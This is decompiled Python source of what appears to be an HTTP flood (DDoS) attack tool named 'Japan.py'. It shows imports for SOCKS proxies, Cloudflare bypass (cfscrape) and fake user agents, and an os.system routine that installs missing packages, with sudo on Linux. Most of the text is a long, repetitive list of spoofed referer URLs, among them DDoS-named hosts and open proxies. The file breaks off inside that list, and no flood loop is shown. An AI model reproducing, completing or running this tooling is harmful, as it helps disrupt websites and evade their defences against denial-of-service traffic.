# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:43:08) [MSC v.1926 32 bit (Intel)]
# Embedded file name: Japan.py
import os, re, ssl, sys, time, random, socket, threading, urllib.request
try:
    import socks, requests, cfscrape, colorama, dns.resolver, fake_useragent
    from colorama import *
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
    from sockshandler import SocksiPyHandler
except ImportError or ModuleNotFoundError:
    print('[-] No module name pysocks  !!!')
    print('[-] No module name requests !!!')
    print('[-] No module name cfscrape !!!')
    print('[-] No module name dns.reso !!!')
    print('[-] No module name colorama !!!')
    print('[-] No module name UserAgent!!!')
    print('[-] No module name BeautSoup!!!')
    print('[+] Installing this modules ...')
    try:
        os.system('pip install PySocks')
        os.system('pip install requests')
        os.system('pip install cfscrape')
        os.system('pip install colorama')
        os.system('pip install dnspython')
        os.system('pip install beautifulsoup4')
        os.system('pip install fake-useragent')
    except:
        if sys.platform == 'win32':
            os.system('python -m pip install PySocks')
            os.system('python -m pip install requests')
            os.system('python -m pip install cfscrape')
            os.system('python -m pip install colorama')
            os.system('python -m pip install dnspython')
            os.system('python -m pip install beautifulsoup4')
            os.system('python -m pip install fake-useragent')
        if sys.platform == 'linux':
            os.system('sudo pip install PySocks')
            os.system('sudo pip install requests')
            os.system('sudo pip install cfscrape')
            os.system('sudo pip install colorama')
            os.system('sudo pip install dnspython')
            os.system('sudo pip install beautifulsoup4')
            os.system('sudo pip install fake-useragent')

else:
    in_proxies = []
    request_num = 0
    numberChecks = 0
    colorama.init(Style.BRIGHT)
    referers = [
     'https://eu1.proxysite.com/process.php?d=',
     'https://eu2.proxysite.com/process.php?d=',
     'https://eu3.proxysite.com/process.php?d=',
     'https://eu4.proxysite.com/process.php?d=',
     'https://eu5.proxysite.com/process.php?d=',
     'https://eu6.proxysite.com/process.php?d=',
     'https://eu7.proxysite.com/process.php?d=',
     'https://eu8.proxysite.com/process.php?d=',
     'https://eu9.proxysite.com/process.php?d=',
     'https://eu10.proxysite.com/process.php?d=',
     'https://us1.proxysite.com/process.php?d=',
     'https://us2.proxysite.com/process.php?d=',
     'https://us3.proxysite.com/process.php?d=',
     'https://us4.proxysite.com/process.php?d=',
     'https://us5.proxysite.com/process.php?d=',
     'https://us6.proxysite.com/process.php?d=',
     'https://us7.proxysite.com/process.php?d=',
     'https://us8.proxysite.com/process.php?d=',
     'https://us9.proxysite.com/process.php?d=',
     'https://us10.proxysite.com/process.php?d=',
     'https://us11.proxysite.com/process.php?d=',
     'https://us12.proxysite.com/process.php?d=',
     'https://us13.proxysite.com/process.php?d=',
     'https://us14.proxysite.com/process.php?d=',
     'https://us15.proxysite.com/process.php?d=',
     'https://divine.graphics/proxy.php?',
     'https://www.localizaip.com.br/localizar-ip.php?ip=',
     'http://www.meuenderecoip.com/localizar-ip.php?ip=',
     'https://website-down.com/',
     'http://clgt.net/proxy.php/',
     'http://proxy.clgt.net/proxy.php/',
     'https://www.pinterest.com/pin/create/button/?url=',
     'https://www.reddit.com/login/?dest=',
     'https://www.reddit.com/submit?url=',
     'https://www.filterbypass.me/s.php?k=',
     'https://www.filterbypass.me/?url=',
     'https://quantrimang.com/url?q=',
     'https://learnsql.xyz/chuyen-huong/?url=',
     'https://user.gtarcade.com/site/login?rurl=',
     'http://e9geolgzk6.com/iuqasfg3?dbqfdh=34&refer=',
     'https://iplookup.flagfox.net/?host=',
     'https://foradoar.org/',
     'https://duckduckgo.com/',
     'https://www.google.com/',
     'https://www.youtube.com',
     'http://www.google.com/?q=',
     'https://www.responsinator.com/?url=',
     'https://king.host/wiki/?url=',
     'https://website.grader.com/results/',
     'https://sitecheck.sucuri.net/results/',
     'https://www.ssllabs.com/ssltest/analyze.html?d=',
     'https://transparencyreport.google.com/safe-browsing/search?url=',
     'https://www.webpagetest.org/?url=',
     'https://www.hostinger.com.br/tutoriais/?url=',
     'https://www.sslshopper.com/ssl-checker.html#hostname=',
     'https://safeweb.norton.com/report/show?url=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://validator.w3.org/check?uri=',
     'http://www.facebook.com/sharer/sharer.php?u=',
     'http://downforeveryoneorjustme.com/',
     'http://network-tools.com/default.asp?prog=ping&host=',
     'http://network-tools.com/default.asp?prog=trace&host=',
     'http://network-tools.com/default.asp?prog=network&host=',
     'https://domainr.com/?q=',
     'https://down.is/',
     'http://whois.domaintools.com/',
     'https://downforeveryoneorjustme.com/',
     'https://www.webhostinghero.com/#',
     'https://www.whoishostingthis.com/#search=',
     'https://ping.eu/port-chk/?url=',
     'https://www.host-tracker.com/?url=',
     'http://hostchecker.net/?url=',
     'https://hostingchecker.com/?url=',
     'https://www.virustotal.com/vi/?url=',
     'http://tainhachay.mobi/?url=',
     'http://trangtainhac.info/?url=',
     'http://www.phimmoi.net/?url=',
     'https://website.informer.com/',
     'https://tainhacvemay.net/?url=',
     'https://nhacvietnam.mobi/?url=',
     'https://waptainhac.net/?url=',
     'https://trangtainhac.net/?url=',
     'https://trangtainhac.com/?url=',
     'https://yamcode.com/?url=',
     'http://network-tools.com/default.asp?prog=ping&host=',
     'http://network-tools.com/default.asp?prog=trace&host=',
     'http://network-tools.com/default.asp?prog=network&host=',
     'http://waptaiaz.com/tai-nhac-mp3/web/artist/list/quality=1&ver=w/?url=',
     'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
     'http://www.google.com/?q=',
     'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://www.google.com/translate?u=',
     'https://developers.google.com/speed/pagespeed/insights/?url=',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://add.my.yahoo.com/rss?url=',
     'https://play.google.com/store/search?q=',
     'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
     'http://vk.com/profile.php?redirect=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=query?=query=..',
     'https://v1.push-time.com/notifications/pub2/cpm/3/infinity/index.html?p1=',
     'https://browsergames2018.com/bestgames/custom/anime/oven/hentai/index.php?country_code=VN&p1=',
     'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
     'http://yandex.ru/yandsearch?text=',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
     'http://go.mail.ru/search?mail.ru=1&q=',
     'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
     'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
     'https://www.google.us/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
     'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://www.google.ru/url?sa=t&rct=?j&q=&e..',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://www.yandex.com/yandsearch?text=',
     'https://duckduckgo.com/?q=',
     'http://www.ask.com/web?q=',
     'http://search.aol.com/aol/search?q=',
     'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://host-tracker.com/check_page/?furl=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'https://jigsaw.w3.org/css-validator/validator?uri=',
     'https://add.my.yahoo.com/rss?url=',
     'http://engadget.search.aol.com/search?q=',
     'https://steamcommunity.com/market/search?q=',
     'http://filehippo.com/search?q=',
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://careers.gatesfoundation.org/search?q=',
     'http://techtv.mit.edu/search?q=',
     'http://www.ustream.tv/search?q=',
     'http://www.ted.com/search?q=',
     'http://funnymama.com/search?q=',
     'http://itch.io/search?q=',
     'http://jobs.rbs.com/jobs/search?q=',
     'http://taginfo.openstreetmap.org/search?q=',
     'http://www.baoxaydung.com.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://www.tceq.texas.gov/@@tceq-search?q=',
     'http://www.reddit.com/search?q=',
     'http://www.bestbuytheater.com/events/search?q=',
     'https://careers.carolinashealthcare.org/search?q=',
     'http://jobs.leidos.com/search?q=',
     'http://jobs.bloomberg.com/search?q=',
     'https://www.pinterest.com/search/?q=',
     'http://millercenter.org/search?q=',
     'https://www.npmjs.com/search?q=',
     'http://www.evidence.nhs.uk/search?q=',
     'http://www.shodanhq.com/search?q=',
     'http://ytmnd.com/search?q=',
     'http://www.google.com/?q=',
     'http://www.google.com/?q=',
     'http://www.google.com/?q=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=',
     'https://steamcommunity.com/market/search?q=',
     'http://filehippo.com/search?q=',
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://careers.gatesfoundation.org/search?q=',
     'http://techtv.mit.edu/search?q=',
     'http://www.ustream.tv/search?q=',
     'http://www.ted.com/search?q=',
     'http://funnymama.com/search?q=',
     'http://itch.io/search?q=',
     'http://jobs.rbs.com/jobs/search?q=',
     'http://taginfo.openstreetmap.org/search?q=',
     'http://www.baoxaydung.com.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://www.tceq.texas.gov/@@tceq-search?q=',
     'http://www.reddit.com/search?q=',
     'http://www.bestbuytheater.com/events/search?q=',
     'https://careers.carolinashealthcare.org/search?q=',
     'http://jobs.leidos.com/search?q=',
     'http://jobs.bloomberg.com/search?q=',
     'https://www.pinterest.com/search/?q=',
     'http://millercenter.org/search?q=',
     'https://www.npmjs.com/search?q=',
     'http://www.evidence.nhs.uk/search?q=',
     'http://www.shodanhq.com/search?q=',
     'http://ytmnd.com/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'https://steamcommunity.com/market/search?q=',
     'http://filehippo.com/search?q=',
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://careers.gatesfoundation.org/search?q=',
     'http://techtv.mit.edu/search?q=',
     'http://www.ustream.tv/search?q=',
     'http://www.ted.com/search?q=',
     'http://funnymama.com/search?q=',
     'http://itch.io/search?q=',
     'http://jobs.rbs.com/jobs/search?q=',
     'http://taginfo.openstreetmap.org/search?q=',
     'http://www.baoxaydung.com.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://www.tceq.texas.gov/@@tceq-search?q=',
     'http://www.reddit.com/search?q=',
     'http://www.bestbuytheater.com/events/search?q=',
     'https://careers.carolinashealthcare.org/search?q=',
     'http://jobs.leidos.com/search?q=',
     'http://jobs.bloomberg.com/search?q=',
     'https://www.pinterest.com/search/?q=',
     'http://millercenter.org/search?q=',
     'https://www.npmjs.com/search?q=',
     'http://www.evidence.nhs.uk/search?q=',
     'http://www.shodanhq.com/search?q=',
     'http://ytmnd.com/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'https://steamcommunity.com/market/search?q=',
     'http://filehippo.com/search?q=',
     'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
     'http://eu.battle.net/wow/en/search?q=',
     'http://engadget.search.aol.com/search?q=',
     'http://careers.gatesfoundation.org/search?q=',
     'http://techtv.mit.edu/search?q=',
     'http://www.ustream.tv/search?q=',
     'http://www.ted.com/search?q=',
     'http://funnymama.com/search?q=',
     'http://itch.io/search?q=',
     'http://jobs.rbs.com/jobs/search?q=',
     'http://taginfo.openstreetmap.org/search?q=',
     'http://www.baoxaydung.com.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://www.tceq.texas.gov/@@tceq-search?q=',
     'http://www.reddit.com/search?q=',
     'http://www.bestbuytheater.com/events/search?q=',
     'https://careers.carolinashealthcare.org/search?q=',
     'http://jobs.leidos.com/search?q=',
     'http://jobs.bloomberg.com/search?q=',
     'https://www.pinterest.com/search/?q=',
     'http://millercenter.org/search?q=',
     'https://www.npmjs.com/search?q=',
     'http://www.evidence.nhs.uk/search?q=',
     'http://www.shodanhq.com/search?q=',
     'http://ytmnd.com/search?q=',
     'http://coccoc.com/search#query=',
     'http://www.search.com/search?q=',
     'http://www.google.com/?q=',
     'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
     'http://vk.com/profile.php?redirect=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=query?=query=..',
     'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
     'http://yandex.ru/yandsearch?text=',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
     'http://go.mail.ru/search?mail.ru=1&q=',
     'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
     'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
     'https://www.google.us/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
     'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://www.google.ru/url?sa=t&rct=?j&q=&e..',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://www.yandex.com/yandsearch?text=',
     'https://duckduckgo.com/?q=',
     'http://www.ask.com/web?q=',
     'http://search.aol.com/aol/search?q=',
     'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
     'https://www.facebook.com/search/results/?init=quick&q=',
     'http://blekko.com/#ws/?q=',
     'http://www.infomine.com/search/?q=',
     'https://twitter.com/search?q=',
     'http://www.wolframalpha.com/input/?i=',
     'http://host-tracker.com/check_page/?furl=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://www.google.com/translate?u=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.onlinewebcheck.com/?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.pagescoring.com/website-speed-test/?url=',
     'http://check-host.net/check-http?host=',
     'http://checksite.us/?url=',
     'http://jobs.bloomberg.com/search?q=',
     'http://www.bing.com/search?q=',
     'https://www.yandex.com/yandsearch?text=',
     'http://www.google.com/?q=',
     'https://add.my.yahoo.com/rss?url=',
     'http://www.bestbuytheater.com/events/search?q=',
     'http://www.shodanhq.com/search?q=',
     'https://play.google.com/store/search?q=',
     'http://coccoc.com/search#query=',
     'https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=',
     'http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
     'http://content-available-to-author-only.com/profile.php?redirect=',
     'http://w...content-available-to-author-only...y.com/search/results?q=',
     'http://y...content-available-to-author-only...x.ru/yandsearch?text=',
     'http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=',
     'http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..',
     'http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..',
     'http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..',
     'http://h...content-available-to-author-only...u.com/searchResult?keywords=',
     'http://w...content-available-to-author-only...g.com/search?q=',
     'https://w...content-available-to-author-only...x.com/yandsearch?text=',
     'https://d...content-available-to-author-only...o.com/?q=',
     'http://w...content-available-to-author-only...k.com/web?q=',
     'http://s...content-available-to-author-only...l.com/aol/search?q=',
     'https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=',
     'http://v...content-available-to-author-only...3.org/feed/check.cgi?url=',
     'http://h...content-available-to-author-only...r.com/check_page/?furl=',
     'http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=',
     'http://j...content-available-to-author-only...3.org/css-validator/validator?uri=',
     'https://a...content-available-to-author-only...o.com/rss?url=',
     'http://e...content-available-to-author-only...l.com/search?q=',
     'https://s...content-available-to-author-only...y.com/market/search?q=',
     'http://f...content-available-to-author-only...o.com/search?q=',
     'http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=',
     'http://e...content-available-to-author-only...e.net/wow/en/search?q=',
     'http://e...content-available-to-author-only...l.com/search?q=',
     'http://c...content-available-to-author-only...n.org/search?q=',
     'http://t...content-available-to-author-only...t.edu/search?q=',
     'http://w...content-available-to-author-only...m.tv/search?q=',
     'http://w...content-available-to-author-only...d.com/search?q=',
     'http://f...content-available-to-author-only...a.com/search?q=',
     'http://i...content-available-to-author-only...h.io/search?q=',
     'http://j...content-available-to-author-only...s.com/jobs/search?q=',
     'http://t...content-available-to-author-only...p.org/search?q=',
     'http://w...content-available-to-author-only...m.vn/news/vn/search&q=',
     'https://play.google.com/store/search?q=',
     'http://w...content-available-to-author-only...s.gov/@@tceq-search?q=',
     'http://w...content-available-to-author-only...t.com/search?q=',
     'http://w...content-available-to-author-only...r.com/events/search?q=',
     'https://c...content-available-to-author-only...e.org/search?q=',
     'http://j...content-available-to-author-only...s.com/search?q=',
     'http://j...content-available-to-author-only...g.com/search?q=',
     'https://w...content-available-to-author-only...t.com/search/?q=',
     'http://m...content-available-to-author-only...r.org/search?q=',
     'https://w...content-available-to-author-only...s.com/search?q=',
     'http://w...content-available-to-author-only...s.uk/search?q=',
     'http://w...content-available-to-author-only...q.com/search?q=',
     'http://www.search.com/search?q=',
     'https://add.my.yahoo.com/rss?url=',
     'https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=',
     'https://www.facebook.com/l.php?u=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://www.google.com/translate?u=',
     'http://downforeveryoneorjustme.com/',
     'http://www.slickvpn.com/go-dark/browse.php?u=',
     'https://www.megaproxy.com/go/_mp_framed?',
     'http://scanurl.net/?u=',
     'http://www.isup.me/',
     'http://check-host.net/check-tcp?host=',
     'http://check-host.net/check-dns?host=',
     'http://check-host.net/check-ping?host=',
     'http://www.currentlydown.com/',
     'http://check-host.net/ip-info?host=',
     'https://safeweb.norton.com/report/show?url=',
     'http://www.webproxy.net/view?q=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'https://anonysurfer.com/a2/index.php?q=',
     'http://analiz.web.tr/en/www/',
     'https://plus.google.com/share?url=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://ddosvn.somee.com/f5.php?v=',
     'http://louis-ddosvn.rhcloud.com/f5.html?v=',
     'http://engadget.search.aol.com/search?q=query?=query=..',
     'https://graph.facebook.com/fql?q=SELECT%20like_count,%20total_count,%20share_count,%20click_count,%20comment_count%20FROM%20link_stat%20WHERE%20url%20=%20%22',
     'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
     'http://yandex.ru/yandsearch?text=',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
     'http://go.mail.ru/search?mail.ru=1&q=',
     'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
     'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
     'https://www.google.us/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
     'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
     'http://vk.com/profile.php?redirect=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=query?=query=..',
     'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
     'http://yandex.ru/yandsearch?text=',
     'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
     'http://go.mail.ru/search?mail.ru=1&q=',
     'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
     'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
     'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
     'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
     'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
     'https://www.google.us/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
     'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
     'http://www.google.ru/url?sa=t&rct=?j&q=&e..',
     'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
     'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://www.google.com/translate?u=',
     'https://developers.google.com/speed/pagespeed/insights/?url=',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://add.my.yahoo.com/rss?url=',
     'https://play.google.com/store/search?q=',
     'http://www.google.com/?q=',
     'http://regex.info/exif.cgi?url=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.google.com/translate?u=',
     'http://translate.google.com/translate?u=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
     'http://validator.w3.org/check?uri=',
